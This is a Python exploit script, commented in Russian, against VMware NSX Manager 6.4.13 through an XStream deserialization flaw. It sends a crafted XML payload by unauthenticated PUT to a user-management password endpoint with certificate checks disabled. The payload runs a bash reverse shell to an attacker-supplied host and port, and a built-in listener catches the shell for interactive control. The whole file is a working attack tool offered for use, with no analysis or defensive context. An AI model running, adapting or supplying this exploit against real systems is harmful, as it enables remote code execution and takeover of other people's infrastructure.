# GenVMNSXDeserExec
# VMWare NSX Manager Exploit - XStream Deserialization RCE
# Version Affected: 6.4.13-19307994


import socket
import sys
import requests
from telnetlib import Telnet
from threading import Thread
from urllib3 import disable_warnings, exceptions

# Отключение предупреждений о небезопасных HTTP-запросах
disable_warnings(exceptions.InsecureRequestWarning)

# Класс для управления обработкой эксплойта и обработки обратного соединения
class ExploitHandler:
    
    def __init__(self, target_host, reverse_host, reverse_port):
        self.target_host = target_host
        self.reverse_host = reverse_host
        self.reverse_port = reverse_port
        self.payload_template = self.create_payload()

    @staticmethod
    # Создание шаблона XStream пейлоада для выполнения RCE
    def create_payload():
        return """
        <sorted-set>
            <string>trigger</string>
            <dynamic-proxy>
                <interface>java.lang.Comparable</interface>
                <handler class="java.beans.EventHandler">
                    <target class="java.lang.ProcessBuilder">
                        <command>
                            <string>bash</string>
                            <string>-c</string>
                            <string>bash -i &#x3e;&#x26; /dev/tcp/{reverse_host}/{reverse_port} 0&#x3e;&#x26;1</string>
                        </command>
                    </target>
                    <action>start</action>
                </handler>
            </dynamic-proxy>
        </sorted-set>"""

    # Создание сокета для прослушивания входящего соединения (обратный шелл)
    def start_listener(self):
        print(f"[+] Запуск прослушивателя на порту {self.reverse_port}")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind(("0.0.0.0", self.reverse_port))
            server_socket.listen(1)
            conn, client_address = server_socket.accept()
            print(f"[+] Получено подключение от {client_address[0]}")
            with Telnet() as telnet_session:
                telnet_session.sock = conn
                print("[+] Взаимодействие с обратным шеллом!")
                telnet_session.interact()

    # Отправка уязвимого HTTP-запроса для выполнения RCE
    def send_exploit(self):
        print(f"[+] Отправка эксплойта на {self.target_host}")
        try:
            response = requests.put(
                f"https://{self.target_host}/api/2.0/services/usermgmt/password/1337", 
                data=self.payload_template.format(reverse_host=self.reverse_host, reverse_port=self.reverse_port), 
                headers={'Content-Type': 'application/xml'}, 
                verify=False
            )
            print("[+] Эксплойт успешно отправлен, ожидайте обратного соединения.")
        except Exception as e:
            print(f"[-] Ошибка при отправке эксплойта: {e}")


# Обработка аргументов командной строки и возврат значений для цели и обратного соединения
def parse_arguments():
    if len(sys.argv) != 3:
        print(f"[+] Использование: {sys.argv[0]} <цель> <обратное_соединение:порт>")
        print(f"[+] Пример: {sys.argv[0]} 192.168.18.135 172.18.182.204:4444")
        sys.exit(1)

    target = sys.argv[1]
    reverse_host = sys.argv[2]
    reverse_port = 4444  # Значение порта по умолчанию

    # Проверка наличия порта в аргументе
    if ":" in sys.argv[2]:
        host_port_split = sys.argv[2].split(":")
        if host_port_split[1].isdigit():
            reverse_port = int(host_port_split[1])
            reverse_host = host_port_split[0]
        else:
            print("[-] Указан неверный порт.")
            sys.exit(1)

    return target, reverse_host, reverse_port


if __name__ == "__main__":
    # Обработка аргументов командной строки
    target_host, reverse_host, reverse_port = parse_arguments()

    # Создание экземпляра класса ExploitHandler
    exploit = ExploitHandler(target_host, reverse_host, reverse_port)

    listener_thread = Thread(target=exploit.start_listener)
    listener_thread.daemon = True  # Завершение при завершении основного потока
    listener_thread.start()

    # Отправка эксплойта на целевой хост
    exploit.send_exploit()
